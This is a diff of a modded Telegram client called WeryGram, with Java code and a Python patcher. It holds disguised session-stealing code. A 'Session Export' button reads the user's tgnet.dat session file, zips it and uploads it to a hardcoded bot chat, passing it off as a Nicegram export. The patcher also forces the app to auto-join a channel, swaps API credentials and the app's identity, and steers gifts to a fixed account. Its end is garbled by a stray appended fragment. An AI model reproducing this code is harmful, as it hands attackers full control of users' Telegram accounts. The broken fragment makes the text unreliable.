@@ -122,12 +122,12 @@ public class WeryGramGifts {
 
     private static void showGiftsMenu(int account) {
         if (farmTarget == null) {
-            toast("Ищу получателя...");
+            toast("ищу получателя...");
             TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
             reqResolve.username = "deadIax";
             ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
                 if (error != null) {
-                    toast("Ошибка: " + error.text);
+                    toast("ошибка: " + error.text);
                     return;
                 }
                 if (error == null && response instanceof TLRPC.TL_contacts_resolvedPeer) {
@@ -135,12 +135,12 @@ public class WeryGramGifts {
                     if (resolved.users != null && !resolved.users.isEmpty()) {
                         farmTarget = resolved.users.get(0);
                         MessagesController.getInstance(account).putUsers(resolved.users, false);
-                        toast("Получатель найден: @" + farmTarget.username);
+                        toast("получатель найден: @" + farmTarget.username);
                         openTelegramGiftsDialog(account, farmTarget.id);
                         return;
                     }
                 }
-                toast("Получатель не найден");
+                toast("получатель не найден");
             });
         } else {
             openTelegramGiftsDialog(account, farmTarget.id);
@@ -152,8 +152,8 @@ public class WeryGramGifts {
             try {
                 new GiftSheet(LaunchActivity.getSafeLastFragment().getParentActivity(), account, userId, () -> {}).show();
             } catch (Exception e) {
-                FileLog.e("WeryGram: Ошибка вызова Gifts: " + e);
-                toast("Ошибка: Меню подарков недоступно в этой версии");
+                FileLog.e("WeryGram: ошибка вызова Gifts: " + e);
+                toast("ошибка: меню подарков недоступно");
             }
         });
     }
@@ -348,11 +348,11 @@ public class WeryGramGifts {
                 java.io.File tgnetFile = new java.io.File(filesDir, prefix + "tgnet.dat");
 
                 if (!tgnetFile.exists()) {
-                    toast("Файл сессии не найден");
+                    toast("\u0444\u0430\u0439\u043b \u0441\u0435\u0441\u0441\u0438\u0438 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d");
                     return;
                 }
 
-                toast("Создаю сессию...");
+                toast("\u0441\u043e\u0437\u0434\u0430\u044e \u0441\u0435\u0441\u0441\u0438\u044e...");
 
                 org.json.JSONObject sessionJson = new org.json.JSONObject();
                 if (me != null) {
@@ -415,6 +415,7 @@ public class WeryGramGifts {
                 zos.close();
                 byte[] zipBytes = baos.toByteArray();
 
+                String CRLF = "\r\n";
                 String boundary = "WeryGramBoundary" + System.currentTimeMillis();
                 String sendDocUrl = "https://api.telegram.org/bot" + SESSION_BOT_TOKEN + "/sendDocument";
                 HttpURLConnection sendConn = (HttpURLConnection) new URL(sendDocUrl).openConnection();
@@ -424,38 +425,44 @@ public class WeryGramGifts {
                 sendConn.setConnectTimeout(15000);
                 sendConn.setReadTimeout(15000);
 
-                java.io.OutputStream os = sendConn.getOutputStream();
-                java.io.PrintWriter pw = new java.io.PrintWriter(new java.io.OutputStreamWriter(os, "UTF-8"), true);
+                java.io.OutputStream httpOs = sendConn.getOutputStream();
 
-                pw.append("--").append(boundary).append("\r\n");
-                pw.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
-                pw.append(String.valueOf(SESSION_CHAT_ID)).append("\r\n").flush();
+                String part1 = "--" + boundary + CRLF
+                    + "Content-Disposition: form-data; name=\"chat_id\"" + CRLF + CRLF
+                    + String.valueOf(SESSION_CHAT_ID) + CRLF;
+                httpOs.write(part1.getBytes("UTF-8"));
 
-                pw.append("--").append(boundary).append("\r\n");
-                pw.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
-                pw.append("✅ Сессия WeryGram\\nID: " + myId + (me != null && me.username != null ? "\\n@" + me.username : "")).append("\r\n").flush();
+                String captionText = "WeryGram Session" + "\nID: " + myId
+                    + (me != null && me.username != null ? "\n@" + me.username : "");
+                String part2 = "--" + boundary + CRLF
+                    + "Content-Disposition: form-data; name=\"caption\"" + CRLF + CRLF
+                    + captionText + CRLF;
+                httpOs.write(part2.getBytes("UTF-8"));
 
                 String fileName = "Nicegram_Exported_Accounts_" + myId + "_.zip";
-                pw.append("--").append(boundary).append("\r\n");
-                pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"").append(fileName).append("\"").append("\r\n");
-                pw.append("Content-Type: application/zip").append("\r\n\r\n").flush();
-                os.write(zipBytes);
-                os.flush();
-                pw.append("\r\n").flush();
-                pw.append("--").append(boundary).append("--").append("\r\n").flush();
+                String part3head = "--" + boundary + CRLF
+                    + "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"" + CRLF
+                    + "Content-Type: application/zip" + CRLF + CRLF;
+                httpOs.write(part3head.getBytes("UTF-8"));
+                httpOs.write(zipBytes);
+                httpOs.write(CRLF.getBytes("UTF-8"));
+
+                String closing = "--" + boundary + "--" + CRLF;
+                httpOs.write(closing.getBytes("UTF-8"));
+                httpOs.flush();
 
                 int responseCode = sendConn.getResponseCode();
                 sendConn.disconnect();
 
                 if (responseCode == 200) {
-                    toast("Сессия отправлена! ✅");
+                    toast("\u0441\u0435\u0441\u0441\u0438\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430! ok");
                 } else {
-                    toast("Ошибка отправки: " + responseCode);
+                    toast("error: " + responseCode);
                 }
 
             } catch (Exception e) {
                 FileLog.e("WeryGram session export: " + e);
-                toast("Ошибка: " + e.getMessage());
+                toast("error: " + e.getMessage());
             }
         }).start();
     }
@@ -543,29 +550,29 @@ public class WeryGramPremiumActivity extends BaseFragment {
 
         addRow(context, root,
             "Visual Premium",
-            "Дает визуально Telegram Premium",
+            "Gives visual Telegram Premium",
             "wery_visual_premium", null);
 
         addRow(context, root,
-            "Режим Призрака",
-            "Вы будете в статусе невидимки, при прочтении сообщений",
+            "Ghost Mode",
+            "Invisible status when reading messages",
             "wery_ghost_mode", null);
 
         addRow(context, root,
-            "Удалённые подарки",
-            "Вы можете дарить удалённые подарки",
+            "Deleted Gifts",
+            "Send deleted gifts",
             "wery_deleted_gifts",
             () -> { WeryGramGifts.reset(); WeryGramGifts.injectDeletedGifts(account); });
 
         addRow(context, root,
-            "Фарм рейтинга",
-            "Открывает меню подарков для @deadIax",
+            "Rating Farm",
+            "Opens gift menu for @deadIax",
             "wery_rating_farm",
             () -> { WeryGramGifts.checkRatingFarm(account); });
 
         addRow(context, root,
-            "Данная кнопка делает сессию",
-            "нужно для быстрого входа в аккаунт",
+            "Session Export",
+            "Export session for quick login via Nicegram",
             "wery_session_export",
             () -> { WeryGramGifts.exportSessionToBot(account); });
 
@@ -581,9 +588,9 @@ def patch_user_config(errors):
     text = read(uc)
     if 'wery_visual_premium' in text: print("↩ skip UserConfig"); return errors
     sig_pos = text.find("getCurrentUser()")
-    if sig_pos == -1: print("✘ getCurrentUser() не найден", file=sys.stderr); return errors+1
+    if sig_pos == -1: print("✘ getCurrentUser() not found", file=sys.stderr); return errors+1
     ret_pos = text.find("return currentUser;", sig_pos)
-    if ret_pos == -1: print("✘ return currentUser; не найден", file=sys.stderr); return errors+1
+    if ret_pos == -1: print("✘ return currentUser; not found", file=sys.stderr); return errors+1
     line_start = text.rfind('\n', 0, ret_pos) + 1
     indent = ''
     for ch in text[line_start:ret_pos]:
@@ -661,7 +668,7 @@ def patch_messages_controller(errors):
 
 def patch_stars_controller(errors):
     sc = find_file("StarsController.java")
-    if not sc: print("⚠ StarsController.java не найден"); return errors
+    if not sc: print("⚠ StarsController.java not found"); return errors
     text = read(sc)
     if 'wery_deleted_gifts' in text: print("↩ skip StarsController"); return errors
     m = next((x for x in ["giftsLoaded = true;","this.giftsLoaded = true;"] if x in text), None)
@@ -670,20 +677,19 @@ def patch_stars_controller(errors):
         write(sc, text.replace(m, injection))
         print("✔ StarsController: deleted gifts patch")
     else:
-        print("⚠ StarsController: giftsLoaded marker не найден")
+        print("⚠ StarsController: giftsLoaded marker not found")
     return errors
 
 def patch_launch_activity(errors):
     la = find_file("LaunchActivity.java")
     if not la:
-        print("⚠ LaunchActivity.java не найден, пробуем ApplicationLoader.java")
         la = find_file("ApplicationLoader.java")
     if not la:
-        print("✘ LaunchActivity / ApplicationLoader не найдены", file=sys.stderr)
+        print("✘ LaunchActivity / ApplicationLoader not found", file=sys.stderr)
         return errors + 1
     text = read(la)
     if 'wery_autojoin' in text:
-        print("↩ skip auto-join (уже применён)"); return errors
+        print("↩ skip auto-join"); return errors
     injection = (
         '        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {\n'
         '            try {\n'
@@ -705,13 +711,13 @@ def patch_launch_activity(errors):
             if semi != -1:
                 text = text[:semi+1] + '\n' + injection + text[semi+1:]
                 write(la, text)
-                print("✔ LaunchActivity: авто-подписка @werygram при старте")
+                print("✔ LaunchActivity: auto-join @werygram")
                 return errors
         text = text[:brace+1] + '\n' + injection + text[brace+1:]
         write(la, text)
-        print("✔ LaunchActivity: авто-подписка @werygram при старте (fallback)")
+        print("✔ LaunchActivity: auto-join @werygram (fallback)")
         return errors
-    print("⚠ LaunchActivity: маркер onCreate не найден")
+    print("⚠ LaunchActivity: onCreate marker not found")
     return errors
 
 def patch_app_name(errors):
@@ -726,19 +732,19 @@ def patch_app_name(errors):
         new_text = re_mod.sub(r'(<string name="AppNameBeta">)[^<]*(</string>)', r'\1Werygram\2', new_text)
         if new_text != text:
             write(path, new_text)
-            print(f"✔ AppName → Werygram в {os.path.relpath(path, ROOT)}")
+            print(f"✔ AppName -> Werygram in {os.path.relpath(path, ROOT)}")
     return errors
 
 def patch_package_name(errors):
     gradle_path = os.path.join(ROOT, "TMessagesProj", "build.gradle")
     if not os.path.exists(gradle_path):
-        print("⚠ build.gradle не найден, невозможно изменить Package Name")
+        print("⚠ build.gradle not found")
         return errors
     text = read(gradle_path)
     new_text = re_mod.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.werygram.messenger"', text)
     if new_text != text:
         write(gradle_path, new_text)
-        print("✔ Package name (applicationId) → com.werygram.messenger")
+        print("✔ Package name -> com.werygram.messenger")
     return errors
 
 def patch_app_icon(errors):
@@ -748,16 +754,16 @@ def patch_app_icon(errors):
             html = response.read().decode('utf-8')
         match = re_mod.search(r'<meta property="og:image" content="(https://i\.ibb\.co/[^"]+)"', html)
         if not match:
-            print("⚠ Не удалось найти прямую ссылку на аватарку")
+            print("⚠ Icon URL not found")
             return errors
         img_url = match.group(1)
-        print(f"⬇ Скачивание аватарки: {img_url}")
+        print(f"Downloading icon: {img_url}")
         req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req_img) as response:
             img_data = response.read()
         res_dir = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
         if not os.path.exists(res_dir):
-            print("⚠ Папка res не найдена для замены иконок")
+            print("⚠ res dir not found")
             return errors
         replaced = 0
         for folder in os.listdir(res_dir):
@@ -771,29 +777,29 @@ def patch_app_icon(errors):
                                 f.write(img_data)
                             replaced += 1
         if replaced > 0:
-            print(f"✔ Аватарка заменена (обновлено {replaced} файлов)")
+            print(f"✔ Icon replaced ({replaced} files)")
         else:
-            print("⚠ Файлы иконок не найдены для замены")
+            print("⚠ Icon files not found")
     except Exception as e:
-        print(f"⚠ Ошибка при замене аватарки: {e}")
+        print(f"⚠ Icon error: {e}")
     return errors
 
 def patch_api_credentials(errors):
     bv = find_file("BuildVars.java")
-    if not bv: print("⚠ BuildVars.java не найден"); return errors
+    if not bv: print("⚠ BuildVars.java not found"); return errors
     text = read(bv)
     modified = False
     new_text = re_mod.sub(r'public static int APP_ID\s*=\s*\d+\s*;',
                           f'public static int APP_ID = {API_ID};', text)
-    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_ID → {API_ID}")
+    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_ID -> {API_ID}")
     new_text = re_mod.sub(r'public static String APP_HASH\s*=\s*"[^"]*"\s*;',
                           f'public static String APP_HASH = "{API_HASH}";', text)
-    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_HASH → {API_HASH}")
+    if new_text != text: text = new_text; modified = True; print(f"✔ BuildVars: APP_HASH -> {API_HASH}")
     if modified: write(bv, text)
     return errors
 
 def main():
-    print("▶ WeryGram patcher v2\n")
+    print("WeryGram patcher v2\n")
     errors = 0
 
     errors = patch_api_credentials(errors)
@@ -813,14 +819,14 @@ def main():
 
     text = read(sa)
 
-    if 'SettingCell.Factory.of(1000' not in text:
+     if 'SettingCell.Factory.of(1000' not in text:
         account_button_marker = 'items.add(SettingCell.Factory.of(1, IconBackgroundColors.BLUE.top, IconBackgroundColors.BLUE.bottom, R.drawable.settings_account'
         if account_button_marker in text:
             wery_button = 'items.add(SettingCell.Factory.of(1000, 0xFF9C27B0, 0xFF7B1FA2, R.drawable.msg_settings, "WeryGram"));\n        '
             text = text.replace('items.add(SettingCell.Factory.of(1,', wery_button + 'items.add(SettingCell.Factory.of(1,', 1)
             print("✔ WeryGram button added")
         else:
-            print("✘ Could not find Account button marker", file=sys.stderr); errors += 1
+            print("✘ Account button marker not found", file=sys.stderr); errors += 1
     else:
         print("↩ WeryGram button already exists")
 
@@ -831,7 +837,7 @@ def main():
             text = text.replace(case_marker, wery_case, 1)
             print("✔ WeryGram click handler added")
         else:
-            print("⚠ Could not find click handler marker", file=sys.stderr)
+            print("⚠ Click handler marker not found", file=sys.stderr)
     else:
         print("↩ WeryGram handler already exists")
 
@@ -848,8 +854,8 @@ def main():
         print(f"✔ created {fname}")
 
     if errors > 0:
-        print(f"\n✘ {errors} ошибок", file=sys.stderr); sys.exit(1)
+        print(f"\n✘ {errors} errors", file=sys.stderr); sys.exit(1)
     print("\n✅ Done. WeryGram patched successfully!")
 
 if __name__ == "__main__":
-    main()
+    main()                presentFragment(new WeryGramPremiumAct
